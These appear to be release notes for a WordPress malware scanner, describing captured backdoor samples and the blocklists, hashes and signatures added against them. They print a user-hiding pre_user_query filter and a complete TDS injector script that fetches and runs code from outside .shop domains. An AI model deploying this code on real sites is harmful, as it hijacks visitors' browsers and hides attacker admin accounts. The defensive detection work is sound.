Version 1.3.53 closes the loop on the persistence chain that 1.3.52 surfaced. The 1.3.52 hidden-admin-user detection found the symptom: an administrator user existed in the database but was invisible to `get_users()` because some active code was filtering them out of every user query. The action text on that finding gave the operator the exact strings to grep for. The operator did the grep, found a plugin called `wp-security-helper`, and uploaded the file for analysis. 1.3.53 adds the captured sample to every detection layer.

What was captured.

The file at `wp-content/plugins/wp-security-helper/wp-security-helper.php` is 3789 bytes, MD5 `50c02424e0e723c019b4d2bf849f2a9b`, SHA-256 `0a26e477951896659dbc5b0b18929995303a9ab4e071288b40691e0b366b96a1`. The plugin docblock claims it is "WP Security Helper" by "WordPress Security Team", licence "GPL v2 or later"  the same fake author string as wp-security-cache.php, which is the strongest evidence the two files come from the same operator chain. Beyond the docblock, the entire file body is obfuscated. WordPress filter and method names appear as hex/octal escape sequences inside double-quoted strings (so `pre_get_users` appears as `\160\162\x65\137\147\145\x74\137\x75\163\145\162\x73`); control flow uses `goto` jumps to scrambled labels to break linear reading. Decoded, the file is straightforward: it instantiates a class via singleton pattern in its constructor, registering five callbacks.

| Hook | Method | Effect when invoked |
|---|---|---|
| `pre_get_users` (action) | `filter_user_query` | If the request is admin-context and `$pagenow === 'users.php'`, set `include => [current_user_id]` on the query |
| `users_list_table_query_args` (filter) | `modify_user_table_args` | Same effect via the list-table args |
| `wp_count_users` (filter) | `adjust_user_count` | Force `$result['total_users']` to 1 |
| `get_users` (filter, priority 999) | `filter_user_results` | Walk the results array; keep only the row matching the current user ID |
| `all_plugins` (filter) | `hide_plugin_from_list` | Unless `$_GET['sp']` is set, `unset($plugins[plugin_basename(__FILE__)])` to hide self from Plugins page |

The combined effect on operator inspection is severe. From within the WP Dashboard, an admin who logs in sees themselves and only themselves in `Users -> All Users`; the user count widget reads "1"; the Plugins page does not show this plugin (so the admin cannot deactivate it through the UI). The malicious admin created by wp-security-cache.php is fully functional  they can log in, they hold a session, they have full administrator capabilities  but they are invisible to every dashboard surface that uses the WP user APIs. This is the persistence pattern that the 1.3.52 direct-`$wpdb` walk was specifically designed to defeat.

What 1.3.53 ships.

The captured sample is now caught at three independent detection layers:

1. **Slug blocklist**: `wp-security-helper` joins `WPS_Blocker::get_blocked_slugs()`. The slug-blocking machinery (originally built for the wp-perf-analytics ClickFix family) handles auto-deactivation and auto-removal of any plugin matching this slug. The plugin cannot be activated; if found active during `is_blocked()` checks, it is forced inactive; the entire plugin directory is queued for removal.

2. **Hash blocklist**: MD5 `50c02424e0e723c019b4d2bf849f2a9b` and SHA-256 `0a26e477951896659dbc5b0b18929995303a9ab4e071288b40691e0b366b96a1` join `WPS_Blocker::get_blocked_hashes()`. Defence in depth: the slug match handles directory-level removal; the hash match handles single-file copies of the malware found anywhere on disk regardless of containing directory name.

3. **Content signatures**: six new entries in `WPS_Scanner::SIGNATURES_BACKDOOR`. Two plain-text strings catch unobfuscated builds and the docblock (`WP_Security_Helper` and `WP Security Helper`); four byte-exact escape-sequence patterns catch the obfuscated forms in this build (encoded `WP_Secur` anchor, full encoded `pre_get_users`, full encoded `wp_count_users`, full encoded `users_list_table_query_args`).

The basename `wp-security-helper.php` joins `WPS_Indicators::secondary_backdoor_filenames()`. The existing 1.3.43 dropper-cache walker, the 1.3.50 toolkit-at-root finding, and the 1.3.50 root-PHP-with-signature finding all now treat this basename as a confirmed-malicious filename for `auto_delete: true` purposes when found at the relevant locations.

A note on the iteration that produced the final signature set. The first attempt to extract escape-sequence signatures used my own mental decoding of "what `WP_Security_Helper` would look like as escape sequences"  this produced the encoded form `\127\120\137\x53\x65\143\165\x72\151\164\171\137\110\x65\154\160\145\x72`. The behavioural test caught this immediately: the captured sample produced only 2 of an expected 4+ signature hits. Inspection revealed that the captured sample uses `\x69` (hex) for the letter `i` in `Security` where my synthesised version used `\151` (octal). Same character (105 decimal), same semantic meaning, different byte sequence. The fix was to extract the actual bytes from the captured sample using a byte-level parser (Python regex over the raw file bytes) rather than reconstructing what the obfuscator "should have" produced. Final signature set: byte-exact full-name patterns for the longest-and-most-distinctive filter names from this sample, plus a shorter `WP_Secur` anchor that contains only octal-encoded characters which appear identically in both encoding styles. The lesson generalises: when adding obfuscated-string signatures to the IoC database, extract the bytes from the captured sample with a byte-level tool. Do not synthesise.

What 1.3.53 does NOT add.

A behavioural detector for "plugin file with `add_filter('all_plugins')` calling `unset($plugins[plugin_basename(__FILE__)])`" was considered  the self-hiding pattern is virtually-always-malicious. It is left out because (a) a small number of legitimate cleanup tools and security plugins do exactly this for legitimate reasons, (b) the existing 1.3.52 hidden-admin-user count-mismatch detection already catches the systemic effect of any user-hiding filter regardless of mechanism, and (c) the slug blocklist and content signatures combined catch this specific build with high confidence. Adding a generic behavioural detector would expand the false-positive surface for marginal additional malware-class coverage.

A behavioural detector for "plugin file containing hex/octal-escaped WordPress filter names" was also considered. It is left out because the heuristic interacts poorly with legitimate obfuscated PHP (e.g., commercial plugins protected by ionCube or SourceGuardian). The byte-exact signatures in 1.3.53 catch the wp-security-helper family without committing to a generic behavioural rule.

Acceptance criteria:

1. `WPS_Blocker::get_blocked_slugs()` contains `wp-security-helper`.
2. `WPS_Blocker::get_blocked_hashes()` contains both MD5 and SHA-256 of the captured sample.
3. `WPS_Indicators::secondary_backdoor_filenames()` contains `wp-security-helper.php`.
4. `WPS_Scanner::SIGNATURES_BACKDOOR` contains both plain-text strings (`WP_Security_Helper`, `WP Security Helper`) and at least three byte-exact escape-sequence patterns.
5. The actual captured sample produces at least 4 signature hits when scanned.
6. A benign plugin sample (Plugin Name docblock + simple `add_action('init', ...)`) produces 0 signature hits.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.53-1`.

## From 1.3.51 to 1.3.52+

Version 1.3.52 closes a detection gap that was hiding behind a correct-looking implementation. The existing user-audit code in `WPS_Forensics::trace_admin_accounts()` calls `get_users()`, which is the WordPress core API for enumerating users. The API is exactly right for almost every legitimate use case; it respects every filter on `pre_user_query`, `users_list_query`, `users_list_query_args`, and the related hooks that themes and plugins use to customise user-listing behaviour. The same property that makes the API correct for plugin developers makes it the wrong primitive for a malware audit.

Why this matters in practice. The wp-security-cache.php malware family creates an administrator user via `wp_create_user()`, which writes a normal database row to `wp_users` and a normal capabilities entry to `wp_usermeta`. The created user is fully functional: they can log in, they can act with administrator privileges, they hold a session that survives password changes on other accounts. The malware does not need to do anything special to make the user persist  the row sits in the database like any other user. What the operator chain often does, however, is pair the file-based malware with a separate filter installer (typically in mu-plugins, theme `functions.php`, or a fake-named plugin) that adds a closure to `pre_user_query`:

```php
add_action( 'pre_user_query', function ( $q ) {
    global $wpdb;
    $q->query_where .= " AND ID NOT IN (47, 53)";
} );
```

The result is that `get_users()`, `WP_User_Query`, and the dashboard `Users -> All Users` page all silently exclude user IDs 47 and 53. The malicious admin still exists, still works, still has a session  but every user-listing surface in WordPress, including WP Perf Shield's own audit, displays them as if they were not there. The operator can verify by visiting `wp-login.php` and authenticating as the hidden user; the dashboard shows only the legitimate operators.

This was the situation a live deployment surfaced. The wp-security-cache.php file had been caught and auto-deleted by 1.3.50's signature scan, so the file-based persistence was gone. The user it created, however, remained in the database, and a separate filter file kept hiding it. The operator could see the wp-security-cache.php finding in the scan history but could not find the user it created in any dashboard surface. The persistence layer survived the file cleanup invisibly.

What 1.3.52 ships.

`WPS_Scanner::check_hidden_admin_users()` is a new check that queries `wp_users` joined with `wp_usermeta` directly via `$wpdb->get_results()`, bypassing the filter chain entirely. The query is parameterised through `$wpdb->prepare()` and selects every user whose capabilities meta value contains `"administrator"`  the LIKE pattern catches both singleton-role rows (`a:1:{s:13:"administrator";b:1;}`) and multi-role rows. The result is the ground-truth list of administrators in the database.

The check then compares the direct-DB count against `count(get_users(['role' => 'administrator', 'fields' => 'ID']))`. Any positive difference is a count-mismatch finding at critical severity: there are admin users the WP API does not see. The action text identifies which user IDs are hidden (computed as set difference between the DB list and the API list) and recommends searching active plugins, theme `functions.php`, and mu-plugins for `pre_user_query` and `users_list_query_args` filter installers as the source of the hiding behaviour.

The same direct walk also produces two more finding types per user. Any admin with a `user_login` matching `WPS_Indicators::hardcoded_admin_usernames()` (currently `adminbackup561801` and `a7f3e9b2c4d1e5f6`) produces a malware-created-username finding. Any admin with a `user_email` matching the regex `/^scan-[a-f0-9]{32}@/i` produces a malware-email-pattern finding  this catches the deterministic email format `scan-<md5(NONCE_KEY)>@<site_host>` that wp-security-cache.php's credential rotation generates, and the case where the operator has rotated the username but kept the email pattern as a forensic indicator that the malware ran on this site.

The three findings are not redundant when they apply to the same user: a hidden user with a malware-created login produces both the count-mismatch finding (operational guidance: find the filter installer) and the username finding (specific user identification with `[HIDDEN]` flag). Each finding type has distinct action text. Within a single user, however, only one of the per-user findings fires  the username check `continue`s past the email check when both match, because adding a second finding on the same user would be noise.

No `auto_delete` on any user finding. The operator MUST review user records before deletion. wp-security-cache.php's "rotation" pattern recreates the user even after deletion if the file is still on disk (the rotation logic is `if (existing) { delete; recreate; }`), so the correct cleanup sequence is:

1. Confirm the file-based malware is gone. The signature scan should show wp-security-cache.php as auto-deleted (1.3.50) or absent.
2. Search for the filter installer. Grep active plugins, theme files, and mu-plugins for the strings `pre_user_query` and `users_list_query_args`. Suspicious match patterns: closures that reference user IDs in their body, or use of `query_where` concatenation with hardcoded ID lists.
3. Remove the filter installer.
4. Verify the count-mismatch finding clears on the next scan.
5. Delete the user record via WP-CLI (`wp user delete <ID>`) or the dashboard Users page (which will now show the user once the filter is gone).
6. Run Hardening > Regenerate auth salts to invalidate any active session the user holds.

What 1.3.52 does NOT ship.

The check does not attempt to find the filter installer source. Doing so would require parsing every active plugin, theme, and mu-plugin file for closures that reference `pre_user_query` and inspecting the closure body for ID-list patterns. The cost of that scan does not justify the marginal detection benefit when the operator can grep manually in seconds. The action text on the count-mismatch finding gives the operator the exact strings to search for.

The check does not attempt to delete the hidden user automatically. The combination of (a) operator-review-required-on-user-records, (b) the rotation-recreation behaviour of wp-security-cache.php, and (c) the diversity of legitimate hidden-user use cases (some hosting providers and security plugins legitimately hide service accounts from the dashboard via this same filter mechanism) makes auto-deletion the wrong default. The finding shape carries no `auto_delete` flag and no `delete_path`.

Acceptance criteria:

1. `WPS_Scanner::run()` calls `check_hidden_admin_users()` between `check_maintenance_mode()` and `check_malicious_db_options()`.
2. The check uses `$wpdb->get_results()` with a parameterised `$wpdb->prepare()` query against `wp_users` joined with `wp_usermeta`. It does NOT use `get_users()`, `WP_User_Query`, or any other filter-respecting API for the ground-truth walk.
3. Direct-DB count > `get_users()` count produces a count-mismatch finding at critical severity, listing the hidden user logins/IDs.
4. Any admin user matching `WPS_Indicators::hardcoded_admin_usernames()` produces a username finding, annotated with `[HIDDEN]` if absent from the API list.
5. Any admin user with email matching `/^scan-[a-f0-9]{32}@/i` produces an email-pattern finding (only if the username check did not already fire for this user).
6. No finding carries `auto_delete: true` or `delete_path`.
7. Three event labels registered: `hidden_admin_user`, `malware_username_in_db`, `malware_email_pattern_in_db`.
8. PHP parser fallback passes on all 19 PHP files.
9. `WPS_Indicators::INDICATOR_VERSION` is `1.3.52-1`.

## From 1.3.50 to 1.3.51+

Version 1.3.51 closes two ABSPATH-root coverage gaps that surfaced when reviewing a fresh batch of live-site uploads. Neither change adds new malware-family detection; both are structural improvements that catch a class of anomaly the existing checks were not designed to surface.

What was uploaded for review.

The fixture batch contained six files: a renamed `.user.ini` (`user.bak`, benign), the `wp-default.php` standalone webshell (already-known IoC), a hash-suffixed readme (`readme_d1ec539626c4cb5f25716f6faa7b182a.html`), a custom one-shot cleanup tool (`wp-clean-perf.php`), and the already-known `wp-phpunit.php` and `wp-security-cache.php` pair. The malware files were caught correctly. The two interesting cases were the hash-suffixed readme and the one-shot cleanup tool  both of which were genuinely novel patterns the scanner had no method for, even though both were already physically present at ABSPATH root.

The `wp-clean-perf.php` file specifically deserves a moment of analysis because its character is mixed. The file declares itself a "WP Malware Cleaner (Single Target)" and contains code that does what it claims  it deactivates the wp-perf-analytics plugin, deletes its file, applies a deny-all .htaccess to the plugin directory, chmods the directory to 0000, and self-deletes after the work completes. The file requires admin authentication via `is_user_logged_in()` and `current_user_can('administrator')`; it is not a webshell. The verdict is "probably benign one-shot tool that failed to self-delete," but the broader principle is that any custom PHP at ABSPATH root warrants a finding regardless of whether the specific file is benign on inspection. WordPress core has a fixed root file set; everything outside it is either a hosting-provider addition, an operator-deliberate decision, or a planted shell. The first two should be made visible to the operator (so they can be reviewed and either retained intentionally or cleaned up after use); the third is what the scanner exists to catch. A medium-severity, review-only finding accomplishes all three.

What 1.3.51 ships.

`WPS_Scanner::check_core_extra_files()` is extended with a non-recursive walk of ABSPATH root after its existing wp-admin/ and wp-includes/ traversal. The root walker compares each `.php` file's basename against two lists. The first is `WPS_Scanner::canonical_root_php_files()`, hard-coded with the 14 wp-*.php files plus `index.php` and `xmlrpc.php`. The second is `WPS_Scanner::known_safe_root_php_extras()`, currently containing `wp-config.php` (user-generated WordPress configuration, deliberately not in the wordpress.org checksums manifest) and `wordfence-waf.php` (Wordfence's auto_prepend_file target, present on every Wordfence-protected site). PHP files matching neither list produce a finding with severity `medium`. The action text frames both possibilities  benign causes (hosting-provider diagnostics, one-shot operator tools, manually-installed dev tools like `adminer.php` or `phpinfo.php`) and malicious causes (planted webshells with custom names, fake "cleanup" tools, staged dropper artefacts)  and recommends operator inspection rather than auto-deletion. The lists are intentionally short. Adding to either should require a clear justification because the cost of a false negative (missing a planted shell with a custom name) exceeds the cost of a false positive (one extra finding the operator dismisses).

`WPS_Scanner::check_renamed_readme()` is a new method that scans ABSPATH root non-recursively for files matching the regex `readme_[a-f0-9]{32}\.html` (case-insensitive). The 32-hex suffix matches the format used by Plesk WP Toolkit and similar hosting tools when creating backup copies during file operations; it also matches the attacker pattern of preserving the legitimate readme.html under a new name while replacing the canonical readme.html with redirect content, a fingerprint-leak page, or attacker text. Both cases warrant a finding. Severity `medium`, no `auto_delete`  the file might be a Plesk backup the operator wants to retain until they verify the originating operation completed. Action text recommends inspecting the contents (canonical WP readme = stale Plesk backup, safe to delete; non-canonical content = the canonical readme has been replaced, restore from clean WP).

What 1.3.51 does NOT ship.

The `wp-default.php` polymorphic variant in the fixture (MD5 `8a92828554a087c46cc21c87fd1b15d4`, SHA-256 `673806e0aadc67be107217cc0e3dcf12486022fe39150ee09494236d317ee02d`) was already in the upload-guard list since 1.3.36. The detection has been working correctly. Initial triage incorrectly flagged the hash as new before re-checking against the existing database; the correction is that 1.3.36's signature-content scan and hash blocklist have been catching this variant from the start.

The `WP_MALWARE_CLEANER_KEY` constant string (`k7P9x2M4vQ8sL1tR`) from `wp-clean-perf.php` is NOT added as an IoC. The cleanup tool is operator-class rather than malware-class; treating its identifier as a malware signature would false-positive on every legitimate copy of similar one-shot tools that hosting providers and security services deploy.

The `scan-<md5(NONCE_KEY)>@<site_host>` admin-user email pattern from `wp-security-cache.php` is NOT added as a wp_users walker check. The hardcoded username `a7f3e9b2c4d1e5f6` is already in `WPS_Indicators::hardcoded_admin_usernames()`, which the existing user-audit check uses to detect this persistence layer. Adding email-pattern detection would be redundant for the case where the malware ran with default settings; if the operator rotates the username, the email pattern detection would still help, but the additional code path is not justified by current threat data. This stays open for a future release if a campaign rotates the username while keeping the email pattern.

Acceptance criteria:

1. `WPS_Scanner::run()` calls `check_renamed_readme()` between `check_core_extra_files()` and `check_maintenance_mode()`.
2. `check_core_extra_files()` walks ABSPATH root non-recursively after the existing wp-admin/ and wp-includes/ traversal.
3. `WPS_Scanner::canonical_root_php_files()` returns the 16 canonical WP root .php basenames.
4. `WPS_Scanner::known_safe_root_php_extras()` returns at minimum `wp-config.php` and `wordfence-waf.php`.
5. PHP files at ABSPATH root not in either list produce a `medium` finding with no `auto_delete`.
6. `check_renamed_readme()` flags files matching `readme_[a-f0-9]{32}\.html` (case-insensitive) at ABSPATH root with `medium` severity and no `auto_delete`.
7. `check_renamed_readme()` does not flag canonical `readme.html` or files with non-32-hex suffixes.
8. PHP parser fallback passes on all 19 PHP files.
9. `WPS_Indicators::INDICATOR_VERSION` is `1.3.51-1`.

## From 1.3.49 to 1.3.50+

Version 1.3.50 is a deploy-feedback release. After 1.3.49 went out and was running on a real victim site, a screenshot of the scan output showed two distinct UX problems with finding shapes that had been correct in design but incomplete in execution. Neither problem changes detection accuracy  every malware finding was still being identified  but both forced the operator into manual remediation steps for cases where the plugin had enough confidence to act on its own. 1.3.50 closes those gaps.

What was happening before 1.3.50.

The screenshot showed three CRITICAL findings sitting on `Needs action`:

| Finding type | File | What it actually meant |
|---|---|---|
| `.sbs toolkit file present at WordPress root` | wp-default.php at ABSPATH | Canonical-malicious basename at canonical-malicious location |
| `.sbs toolkit file present at WordPress root` | wp-phpunit.php at ABSPATH | Same |
| `.sbs toolkit file present at WordPress root` | wp-security-cache.php at ABSPATH | Same |

And two more CRITICAL findings on the same files:

| Finding type | File | Match |
|---|---|---|
| `malware signature in WordPress root PHP file` | wp-default.php | UM_AUTO_ROOT_MODE / UMSESSID |
| `malware signature in WordPress root PHP file` | wp-security-cache.php | a7f3e9b2c4d1e5f6 |

Five `Needs action` findings on three files, all of which the plugin had every IoC necessary to confidently auto-delete: filename in the secondary-backdoor list, ABSPATH-root location, and (for two of them) a content-signature match against `SIGNATURES_BACKDOOR`. The detection layer was correct. The remediation hint was missing because the finding shape lacked `auto_delete: true` and `delete_path` keys. The auto-remediator only triggers on findings carrying those keys, so the operator was being asked to delete files manually that the scanner had every reason to delete itself.

The screenshot also showed four hidden-directory false-positives:

| Path | Why it fired | Why it was wrong |
|---|---|---|
| `wp-content/plugins/fast-indexing-api/.vscode` | Hidden dev directory | Plugin author shipped IDE config; medium severity is correct, no change |
| `wp-content/plugins/wp-last-modified-info/vendor/deliciousbrains/wp-background-processing/.github` | Hidden directory | Composer-vendored library's GitHub Actions config |
| `wp-content/plugins/wp-last-modified-info/vendor/deliciousbrains/wp-background-processing/.circleci` | Hidden directory | Same library's CI config |
| `wp-content/plugins/w3-total-cache/vendor/aws/aws-php-sns-message-validator/.github` | Hidden directory | AWS SDK's GitHub Actions config |
| `wp-content/plugins/wp-file-manager/lib/files/.trash` | Hidden directory | wp-file-manager's own runtime trash dir |

The first one (`.vscode` outside vendor) is a deployment-discipline issue the operator should know about; medium severity stays. The next three are Composer-vendored CI configuration directories that ship as part of the legitimate library distribution. The last is the wp-file-manager plugin's own functional runtime directory  the plugin itself is already separately flagged as high-risk via `check_high_risk_plugins` (CVE-2020-25213), so finding `.trash` inside it is double-counted noise.

What 1.3.50 ships.

`WPS_Scanner::check_auto_prepend_hijack` section 3a (the `.sbs toolkit file present at WordPress root` finding) now adds `auto_delete: true` and `delete_path` to the finding shape. The action text is rewritten to reflect that the file will be auto-deleted: "Auto-deleted because the basename is on the secondary-backdoor list and ABSPATH-root location has no benign explanation. After deletion: confirm auto_prepend_file directives and the includes inside wordfence-waf.php do not reference it; run Hardening > Regenerate auth salts." The post-deletion guidance is preserved and now reads naturally as follow-up to an action already taken.

`WPS_Scanner::check_root_file_signatures` now adds `auto_delete: true` and `delete_path` to the finding ONLY when the matched file's basename is in `secondary_backdoor_filenames()`. The conservative split matters: a content-signature match in `wp-default.php` (known-bad basename) is unambiguous and auto-deletes; a content-signature match in `wp-blog-header.php` (legitimate WP core file) keeps the existing `Needs action` posture so the operator can review whether the file is a planted shell or a tampered core file. The first warrants removal, the second warrants restoration via `wp core download --force`.

`WPS_Scanner::check_dropper_cache` hidden-directory walker gains two filter rules. The first is the vendor-CI exclusion: when a hidden directory's path contains `/vendor/` AND its basename is in the safe list `.github`, `.circleci`, `.gitlab`, `.gitea`, `.docker`, `.husky`, `.ddev`, the directory is skipped. These names cover the routine continuous-integration configuration that Composer-vendored libraries ship with; thousands of legitimate WordPress plugins include them via Composer dependencies. Outside `/vendor/`, the same basenames continue to flag because their presence at a plugin's root is a deployment-discipline issue worth surfacing. The second filter rule is wp-file-manager-specific: a `.trash` directory under any path containing `/wp-file-manager/` is skipped because the plugin uses this directory as part of its own functional design. Other hidden directories under wp-file-manager would still fire (the rule is narrow to `.trash` only), and the wp-file-manager plugin itself remains flagged as high-risk via the existing `check_high_risk_plugins` path.

Why the wp-file-manager plugin remains `Needs action` rather than `auto_delete`. wp-file-manager is in a different category from the backdoor files. The plugin is real, has real users, has real (if dangerous) functionality, and an operator may have installed it deliberately. Auto-deleting an entire functional plugin would break workflows in cases where the operator wants to migrate to a different file manager first. The operator decision is preserved by keeping it as `Needs action` with high severity and CVE reference.

Acceptance criteria:

1. The `.sbs toolkit file present at WordPress root` finding carries `auto_delete: true` and `delete_path`.
2. The `malware signature in WordPress root PHP file` finding carries `auto_delete: true` and `delete_path` only when the basename is in `secondary_backdoor_filenames()`.
3. The hidden-directory walker skips `.github`, `.circleci`, `.gitlab`, `.gitea`, `.docker`, `.husky`, `.ddev` when the path contains `/vendor/`.
4. The hidden-directory walker skips `.trash` when the path contains `/wp-file-manager/`.
5. Hidden directories outside `/vendor/` (e.g. `.vscode` at a plugin root, `.suspicious` anywhere under wp-content) still fire correctly.
6. PHP parser fallback passes on all 19 PHP files.
7. `WPS_Indicators::INDICATOR_VERSION` is `1.3.50-1`.

## From 1.3.48 to 1.3.49+

Version 1.3.49 lands two new IoC sets after a live-site dump revealed two simultaneous infections at canonical hiding spots. The release does not change any detection logic; the existing scanner machinery already catches these once the IoCs are loaded.

What was captured.

The first sample is `wp-content/languages/wp-locale-handler.php`, 14893 bytes, MD5 `a4f6a499ea1c34ae15dcf108e0fa197b`. This is the wp-locale-handler RAT v1.7 family at its canonical original hiding place  the location that gave the family its name. Earlier captures (1.3.44, 1.3.45) found the same family rebranded as `cert-check.php` under `.well-known/pki-validation/`; the languages/ copy is the staging master where the operator keeps a copy to recreate the rebranded variants. Every family signature count matches the earlier samples: 2 hits each on the activation key `a3f8b2c1d4e5f607` and the mode-l/t marker `d3AtY29udGVudC91cGxvYWRz`, 1 hit each on `wp_session_tokens_config` / `session-manager.php` / the HMAC tail / the full HMAC seed / the mode-l harvester header / the mode-t harvester header, 3 hits on the mode-q gate key. The XOR seed extracted from the credential-harvester payload is the seed for the second victim site  the same operator-target identified from the 1.3.45 cert-check.php sample set. This confirms that the operator reuses one binary across multiple victim sites; the XOR seed identifies which victim's data the build was customised against, not where the build was deployed. the second victim site is now annotated as `CONFIRMED ACTIVE` in the operator-target list.

The second sample is `wp-content/mu-plugins/tji-site-js.php`, 1570 bytes, MD5 `47ff560f2c1096757cbfad5291ccc959`. This is a NEW family entirely separate from the wp-locale-handler RAT  a TDS (Traffic Distribution System) drive-by injector. It registers itself as a "Theme JS Injector / TJI Site JavaScript" mu-plugin with self-description "Injected by Theme JS Injector (one-shot). Safe to keep; update TJI one-shot to change code." That self-description is a social-engineering attempt: an admin who sees it in the plugins list reads "TJI" as a legitimate optimisation tool. The PHP wrapper hooks `wp_head`, `wp_body_open`, and `wp_footer` to inject JavaScript on every front-end pageview, with explicit early-returns for `is_admin()`, `wp_doing_ajax()`, `DOING_CRON`, and `wp_is_json_request()`  the standard stealth pattern that ensures admins never see the injection in any dashboard or scanner that loads pages through admin-context.

The injected JavaScript is the textbook TDS shape:

```javascript
if (!window.__performance_optimizer_v6 && (window.__performance_optimizer_v6 = !0)) {
  for (var encodedDomains = ["aHR0cHM6Ly9udGRuZXd0ZHMuc2hvcA==", "L2pzcmVwbz9ybmQ9", "aHR0cHM6Ly9kbnNuZXd0ZHMuc2hvcA=="],
       domains = [], i = 0; i < encodedDomains.length; i++) domains.push(atob(encodedDomains[i]));
  var combinations = [[0, 1], [2, 1], [2, 1]];
  function loadScript(n) {
    if (!(n >= combinations.length)) try {
      var o = domains[combinations[n][0]] + domains[combinations[n][1]] + Math.random(),
          i = new XMLHttpRequest;
      if (i.open("GET", o, !1), i.send(), 200 == i.status) {
        var e = document.createElement("script");
        e.text = i.responseText, document.head.appendChild(e)
      } else loadScript(n + 1)
    } catch (o) { loadScript(n + 1) }
  } loadScript(0)
};
```

The decoded domains: `https://ntdnewtds.shop` and `https://dnsnewtds.shop`, both `.shop` TLDs which are heavily abused for TDS infrastructure. The path component `/jsrepo?rnd=` plus `Math.random()` is appended for cache-busting and analytics. The fallback chain attempts three combinations to handle DNS sinkholing of either domain. The script appended to `document.head` then runs whatever the TDS server decides to serve  affiliate redirects, malicious popups, browser-exploit chains, cryptominers; the operator can change the payload server-side without touching any victim site.

What 1.3.49 ships.

Two hash entries in the upload-guard list (one MD5 + one SHA-256 per sample, four entries total). Seven content signatures in `WPS_Scanner::SIGNATURES_BACKDOOR`: the structural strings (`tji_mu_script_js`, `__performance_optimizer_v6`, `Theme JS Injector`), the base64-encoded TDS C2 URLs, and the plain-text TDS C2 domains. The structural strings are the most durable  the operator could rotate the C2 domains weekly without breaking detection, but renaming the global variable `tji_mu_script_js` requires redesigning the entire wrapper. `tji-site-js.php` joins `WPS_Indicators::secondary_backdoor_filenames()` so the existing walkers catch the basename anywhere on disk. A new accessor `WPS_Indicators::tds_c2_domains()` returns the two captured C2 domains for firewall/edge-blocking documentation; detection works without it.

Why this is two-paragraph notable. Across the conversation history of this plugin we have caught one malware family at a time. The 1.3.49 capture is the first instance of two simultaneous co-infections from different operator chains at the same victim site. The wp-locale-handler RAT is the credential-harvester / persistence chain; the TDS injector is the visitor-monetisation chain. They do not share infrastructure, signatures, hiding patterns, or even general purpose. The operator either runs both as parallel monetisation streams, or two operators have compromised the same site and neither has detected the other. From the defender's perspective the situation is the same: every removal sequence must be run against both families independently. Cleaning the RAT does not clean the TDS injector and vice versa.

Acceptance criteria:

1. `WPS_Blocker::get_blocked_hashes()` contains all four new hash strings (two MD5, two SHA-256).
2. `WPS_Scanner::SIGNATURES_BACKDOOR` contains the seven new TDS family entries.
3. `WPS_Indicators::secondary_backdoor_filenames()` contains `tji-site-js.php`.
4. `WPS_Indicators::tds_c2_domains()` exists and returns at least `['ntdnewtds.shop', 'dnsnewtds.shop']`.
5. `WPS_Indicators::known_rat_operator_targets()` annotation for the second victim site is updated to reflect confirmed-active status.
6. PHP parser fallback passes on all 19 PHP files.
7. `WPS_Indicators::INDICATOR_VERSION` is `1.3.49-1`.

## From 1.3.47 to 1.3.48+

Version 1.3.48 closes the two remaining gaps in the core-integrity story that 1.3.47 started. 1.3.47 verified core file *content* against the WordPress.org manifest. It correctly catches modifications and deletions of files that ARE in the manifest. It does not catch additions  files that are NOT in the manifest because they shouldn't exist  and it does not catch a related class of attack where the operator deliberately leaves the site in maintenance mode while modifying it.

The first new check, `check_core_extra_files`, reads the same cached manifest from 1.3.47 and walks `wp-admin/` and `wp-includes/` looking for PHP files whose relative path is not a manifest key. The two directories are bounded scopes (~250 and ~850 PHP files respectively in WP 6.9.4) so the walker cost is low. Severity is `high` rather than `critical` because the operator may have legitimately added a custom PHP file for debugging or hosting integration; the action text recommends inspection before deletion. No `auto_delete` flag, for the same reason.

Why the manifest reuse matters. 1.3.47 already fetches and caches the manifest with a 24-hour TTL. The new check piggybacks on that cache  no additional network traffic, no additional version-validation logic, no additional failure path. If 1.3.47's network call failed and the manifest is empty, the new check returns zero findings (same graceful-skip semantics).

The second new check, `check_maintenance_mode`, looks for `<ABSPATH>/.maintenance`. WordPress creates this file during core updates as a 503-and-message lock for front-end visitors, and removes it on completion. A persisting `.maintenance` file means either a crashed update (manual deletion of the file restores the site) or an attacker deliberately locking out front-end traffic to install a backdoor while no users can see what's happening. Severity escalates with age:

| File age | Severity | Likely cause |
|---|---|---|
| <10 min | (silent) | Ongoing legitimate update |
| 10-60 min | `medium` | Stuck update or operator inattention |
| 1-24 hr | `high` | Probably attacker-staged or long-crashed update |
| >24 hr | `critical` | No benign explanation |

The 10-minute lower threshold is calibrated to the longest legitimate WordPress core update I have observed in the wild (3-5 minutes for a major version on a slow shared host). Setting the threshold at 10 minutes guarantees no false alerts on normal update cycles while catching the cases where the update genuinely went sideways. No `auto_delete` because the operator may want to verify a real update is in progress before removing the lock file.

What is now covered.

| Layer | Catches |
|---|---|
| `check_core_checksums` (1.3.47) | Modified or missing core files (sha1 mismatch vs manifest) |
| `check_core_extra_files` (1.3.48) | PHP files in wp-admin/ or wp-includes/ that are not in the manifest |
| `check_maintenance_mode` (1.3.48) | Stale `.maintenance` file indicating crashed update or attacker stage |

Together with `check_xmlrpc_integrity` (1.3.46), `check_wp_config_integrity`, and the family-signature plus generic-pattern checks, the WordPress core surface is now triangulated: any modification, addition, removal, or operational anomaly produces a finding through at least one path.

Acceptance criteria:

1. `WPS_Scanner::run()` calls `check_core_extra_files()` and `check_maintenance_mode()` between `check_core_checksums()` and `check_malicious_db_options()`.
2. `check_core_extra_files` reads the cached manifest from `fetch_core_checksums()` and only flags `.php` files.
3. Extra-file findings are severity `high` with no `auto_delete`.
4. `check_maintenance_mode` returns no findings when `.maintenance` does not exist or is younger than 600 seconds.
5. Severity escalates by age threshold: 600s/3600s/86400s -> medium/high/critical.
6. Maintenance findings have no `auto_delete`.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.48-1`.

## From 1.3.46 to 1.3.47+

Version 1.3.47 closes the last detection gap on the WordPress core itself. 1.3.46 verified one core file at a time (`xmlrpc.php`); earlier releases covered `wp-config.php`. Everything else under `wp-admin/` and `wp-includes/` was checked only by signature scanning, which catches known threats but does not catch a clean-bytes-on-disk modification that does not match any signature. 1.3.47 fixes that by hashing every core file and comparing against the official manifest published by WordPress.org.

